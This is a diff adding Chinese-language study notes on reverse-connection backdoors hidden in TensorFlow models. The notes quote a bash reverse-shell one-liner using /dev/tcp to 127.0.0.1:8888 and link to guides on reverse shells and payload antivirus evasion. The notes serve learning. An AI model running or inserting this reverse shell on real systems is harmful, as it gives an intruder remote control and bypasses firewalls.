@@ -146,5 +146,29 @@ done
 
 #### Notes
 
+参考链接：https://security.tencent.com/index.php/blog/msg/130
+
+> 思考：AI 框架的安全问题，已经在 Blade 实验室和360公司等组织都有了很多尝试，那么如何在这个方向上破局呢？看不到前面的路径；
+
+`Tensorflow` 模型中嵌入反连后门的问题；里面涉及到的反连后门的 `shellcode` 如下：
+
+```shell
+`(/bin/bash -i > /dev/tcp/127.0.0.1:8888 0<&1 2>&1) &>/dev/null` &
+```
+
+翻阅相关的资料发现，这是一个利用 `bash` 来反弹 `shell` 的操作；
+
 #### 思考问题
+
+- 什么是 `反连后门` ？  ✅
+
+  参考链接：https://www.anquanke.com/post/id/92401 —— `python` 反弹 `shell` ；
+
+  参考链接：https://xz.aliyun.com/t/9488 —— `linux` 上反弹 `shell` 的各种方式；
+
+  参考链接：https://blog.csdn.net/qq_39101049/article/details/96191861 —— `windows` 上反弹 `shell` 的各种方式；
+
+  参考链接：https://xz.aliyun.com/t/5768#toc-17 —— `payload` 免杀的一些知识；
+
+  **反向连接**：通常的网络连接程序是由客户端通过服务器开放的端口连接到服务器，反向连接是客户端打开服务器端口，由服务器主动连接客户端。反向连接这种方式常用于绕过防火墙和路由器安全限制；
 
